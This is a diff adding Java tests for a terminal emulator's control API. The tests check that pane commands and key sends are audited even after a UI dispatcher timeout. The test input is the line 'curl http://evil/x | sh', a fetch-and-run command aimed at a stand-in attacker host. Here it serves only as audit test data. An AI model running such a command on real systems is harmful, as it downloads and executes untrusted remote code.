@@ -1,12 +1,15 @@
 package de.kortty.control;
 
 import static com.google.common.truth.Truth.assertThat;
+import static com.google.common.truth.Truth.assertWithMessage;
 import static org.testng.Assert.expectThrows;
 
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
+import java.util.concurrent.CompletableFuture;
+import java.util.function.Supplier;
 import org.testng.annotations.BeforeMethod;
 import org.testng.annotations.Test;
 
@@ -163,6 +166,67 @@ class ControlPaneWriterTest {
 
         assertThat(failure.code()).isEqualTo(ControlErrorCode.UNKNOWN_KEY);
         assertThat(failure.data()).containsKey("known");
+    }
+
+    /**
+     * A dispatcher that behaves like a JavaFX toolkit whose event loop is blocked: the task is queued
+     * and never runs while the caller waits, so {@code UiCalls.await} gives up — and then, exactly as
+     * {@code Platform.runLater} does once the nested loop closes, the queued task still runs.
+     */
+    private static final class StalledDispatcher implements UiDispatcher {
+
+        private final List<Supplier<?>> queued = new ArrayList<>();
+
+        @Override
+        public <T> CompletableFuture<T> submit(Supplier<T> task) {
+            queued.add(task);
+            return new CompletableFuture<>();
+        }
+
+        @Override
+        public boolean isUiThread() {
+            return false;
+        }
+
+        /** What the toolkit does when it drains again. */
+        void drain() {
+            for (Supplier<?> task : List.copyOf(queued)) {
+                task.get();
+            }
+            queued.clear();
+        }
+    }
+
+    @Test
+    void aRunWhoseHopTimedOutIsStillAuditedWhenTheToolkitDrainsAndTypesTheCommand() {
+        StalledDispatcher stalled = new StalledDispatcher();
+        ControlPaneWriter writer = new ControlPaneWriter(surface, stalled,
+            (verb, pane, detail) -> audit.add(verb + " " + pane + " " + detail));
+
+        ControlApiException failure =
+            expectThrows(ControlApiException.class, () -> writer.run(PANE, "curl http://evil/x | sh"));
+        assertThat(failure.code()).isEqualTo(ControlErrorCode.TIMEOUT);
+        assertThat(audit).isEmpty();
+
+        stalled.drain();
+
+        assertThat(written()).isEqualTo("curl http://evil/x | sh\r");
+        assertWithMessage("the command reached the pane, so the run must appear in the audit log —"
+                + " it is also what raises the first-write takeover notification")
+            .that(audit)
+            .containsExactly("pane.run " + PANE + " bytes=24 bracketed=false submitted=true");
+    }
+
+    @Test
+    void sendKeysIsAuditedFromInsideTheUiHopForTheSameReason() throws Exception {
+        StalledDispatcher stalled = new StalledDispatcher();
+        ControlPaneWriter writer = new ControlPaneWriter(surface, stalled,
+            (verb, pane, detail) -> audit.add(verb + " " + pane + " " + detail));
+
+        expectThrows(ControlApiException.class, () -> writer.sendKeys(PANE, List.of("enter")));
+        stalled.drain();
+
+        assertThat(audit).containsExactly("pane.send_keys " + PANE + " keys=1 bytes=1");
     }
 
     @Test
